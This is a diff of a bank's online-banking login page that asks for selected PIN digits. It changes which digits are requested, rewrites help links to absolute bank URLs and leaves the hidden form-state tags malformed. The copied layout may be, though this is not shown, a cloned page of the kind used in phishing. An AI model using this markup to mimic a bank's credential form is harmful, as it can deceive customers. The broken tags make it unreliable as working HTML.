@@ -12,9 +12,9 @@
 	</HEAD>
 	<body bottomMargin="0" bgColor="white" leftMargin="0" topMargin="0" rightMargin="0">
 		<form name="frm2" method="post" action="Login2.aspx" id="frm2" autocomplete="off">
-<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="" /="/"
 
-<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="" />
+<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="" /="/"
 			<table cellSpacing="0" cellPadding="0" width="760" align="center" bgColor="#ffffff" border="0">
 				<tr>
 					<td style="WIDTH: 758px">
@@ -52,15 +52,15 @@
 												</TR>
 												<TR>
 													<TD width="30%">&nbsp;</TD>
-													<td align="left"><span id="lblDigit1" class="FormStyle1">Digit No. 2</span>&nbsp;<input name="txtDigitA" type="password" maxlength="1" id="txtDigitA" tabindex="1" class="btm" size="1" onKeyup="FocusNext(1);" /></td>
+													<td align="left"><span id="lblDigit1" class="FormStyle1" style="display:inline-block;">Digit No. 3</span>&nbsp;<input name="txtDigitA" type="password" maxlength="1" id="txtDigitA" tabindex="1" class="btm" size="1" onKeyup="FocusNext(1);" /></td>
 												</TR>
 												<TR>
 													<TD width="30%">&nbsp;</TD>
-													<td align="left"><span id="lblDigit2" class="FormStyle1">Digit No. 4</span>&nbsp;<input name="txtDigitB" type="password" maxlength="1" id="txtDigitB" tabindex="2" class="btm" size="1" onKeyup="FocusNext(2);" /></td>
+													<td align="left"><span id="lblDigit2" class="FormStyle1" style="display:inline-block;">Digit No. 5</span>&nbsp;<input name="txtDigitB" type="password" maxlength="1" id="txtDigitB" tabindex="2" class="btm" size="1" onKeyup="FocusNext(2);" /></td>
 												</TR>
 												<TR>
 													<TD width="30%">&nbsp;</TD>
-													<TD align="left"><span id="lblDigit3" class="FormStyle1">Digit No. 3</span>&nbsp;<input name="txtDigitC" type="password" maxlength="1" id="txtDigitC" tabindex="3" class="btm" size="1" onKeyup="FocusNext(3);" /></TD>
+													<TD align="left"><span id="lblDigit3" class="FormStyle1" style="display:inline-block;">Digit No. 4</span>&nbsp;<input name="txtDigitC" type="password" maxlength="1" id="txtDigitC" tabindex="3" class="btm" size="1" onKeyup="FocusNext(3);" /></TD>
 												</TR>
 												<tr id="trContinue">
 													<td width="30%">&nbsp;</td>
@@ -76,11 +76,11 @@
 											read the following;</p>
 										<ul>
 											<li>
-												<a id="HyperLink2" tabindex="6" class="contentlink" href="info-faq.aspx" target="_blank">general</a>
+												<a id="HyperLink2" tabindex="6" class="contentlink" href="https://www.permanenttsb.ie/aboutus/needhelp/allaboutonlinebanking/" target="_blank">general</a>
 											<li>
-												<a id="HyperLink1" tabindex="7" class="contentlink" href="info-tech.aspx" target="_blank">technical</a>
+												<a id="HyperLink1" tabindex="7" class="contentlink" href="https://www.permanenttsb.ie/aboutus/needhelp/allaboutonlinebanking/technical-questions/" target="_blank">technical</a>
 											<li>
-												<a id="Hyperlink5" tabindex="8" class="contentlink" href="Info-Security.aspx" target="_blank">security</a></li></ul>
+												<a id="Hyperlink5" tabindex="8" class="contentlink" href="https://www.permanenttsb.ie/aboutus/needhelp/security/" target="_blank">security</a></li></ul>
 										<p>Still having problems?</p>
 										<p>Call us on <strong>1890 500 121</strong> Monday-Friday 8am-10pm or Saturday 
 											10am-2pm.(International +353 1 212 4101)</p>
